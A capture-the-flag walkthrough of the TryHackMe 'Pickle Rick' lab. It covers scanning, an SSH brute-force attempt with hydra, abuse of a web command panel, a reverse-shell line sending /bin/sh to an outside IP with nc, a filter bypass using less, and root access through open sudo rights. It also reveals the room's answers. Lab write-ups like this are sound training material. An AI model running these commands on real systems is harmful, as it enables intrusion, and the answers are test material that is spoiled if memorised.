# thm-Pickle_Rick

https://tryhackme.com/room/picklerick

`IP=10.10.153.186`

## What is the first ingredient Rick needs?
 We can access the webserver at https://10-10-153-186.p.thmlabs.com/

### Page source

 On viewing the page source I get:
 ```html
   <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
 ```

### GoBuster

 Lets do some basic enumeratrion with gobuster

 ```bash
 gobuster  dir -u https://10-10-153-186.p.thmlabs.com/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee scan.txt 
 ```

 This returns
 ```
/assets               (Status: 301) [Size: 343] [--> http://10-10-153-186.p.thmlabs.com/assets/]
/server-status        (Status: 403) [Size: 315]     
 ```

 This Assets directory at first sight doesnt seem to have much interesting in it.

 And Server Status I need to be authenticated for.

 ### nmap
 
 Lets scan for what ports are available

 ```bash
 nmap -sV -Pn -vv -oA './nmap/nmap_scans' 10.10.88.88
 ```

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
```

Ok so it looks like we also have SSH open.

Lets try and bruteforce it using hydra

### hydra

```bash
hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt 10.10.153.186  ssh -vvv | tee hydra_ssh.log

```

This doesnt work - Looks like we need a ssh key to connect this way.

### gobuster

Back to the scanning - we know we are running a apache server so lets use the common
```bash
gobuster dir -u https://10-10-153-186.p.thmlabs.com/ -w /usr/share/wordlists/dirb/common.txt | tee scan.txt
```

This nets us some more results:
```
/.hta                 (Status: 403) [Size: 306]
/.htaccess            (Status: 403) [Size: 311]
/.htpasswd            (Status: 403) [Size: 311]
/assets               (Status: 301) [Size: 343] [--> http://10-10-153-186.p.thmlabs.com/assets/]
/index.html           (Status: 200) [Size: 1062]                                                
/robots.txt           (Status: 200) [Size: 17]                                                  
/server-status        (Status: 403) [Size: 315] 
```

Looking at robots.txt we have
`Wubbalubbadubdub`

### nikto

Using Nikto we do another scan:
```bash
nikto -h 10.10.153.186
```

This retrieves:
```
+ /login.php: Admin login page/section found.
```

An interesting login page. Lets have a look at it.

Trying the username `R1ckRul3s` and password `Wubbalubbadubdub` lets me in!

I now see a commands panel - and other tabs - but i'm denied from viewing them.

### Command Panel

On the command panel it looks like i can just execute any command e.g.
```bash
ls
```
```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

That `Sup3rS3cretPickl3Ingred.txt` looks interesting - lets cat it out?

I get `Command disabled to make it hard for future PICKLEEEE RICCCKKKK.`

Looks like I cant do that :(

Lets try a reverse shell:
```bash
/bin/sh | nc 10.9.0.247 4444
```

It doesnt see to work either...

### Browser

It looks like i can just open the file through the browser..
https://10-10-153-186.p.thmlabs.com/Sup3rS3cretPickl3Ingred.txt

`mr. meeseek hair` - Thats the first ingredient

## Whats the second ingredient Rick needs?

Looking at clue.txt it says:
`Look around the file system for the other ingredient.`

So lets see if I can ls root?

When I do `ls /home/rick` it returns `second ingredients`

### less

cat was blocked from us - but it looks like we can still use `less` - so lets use this to print out the second ingredient:

```bash
less /home/rick/"second ingredients"
```

Results in:
```
1 jerry tear
```

## Whats the final ingredient Rick needs?

I think that for the final ingredient its likely we need propper ssh access? So I'm hunting for a ssh private key.

Can't find one..

Lets try and raise my access through this panel

Checking what sudo access this user has:
```bash
sudo -l
```

```
Matching Defaults entries for www-data on ip-10-10-153-186.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-153-186.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

`(ALL) NOPASSWD: ALL` means that we can access ANY command without a password... Thats all we need.

Lets view root:
```bash
sudo ls /root
```

```
3rd.txt
snap
```

Great so we can see the 3rd ingredient here... lets find a way to read it.

Using the same less command we get:
```bash
sudo less /root/3rd.txt
```

```
3rd ingredients: fleeb juice
```

And thats it! We have completed it!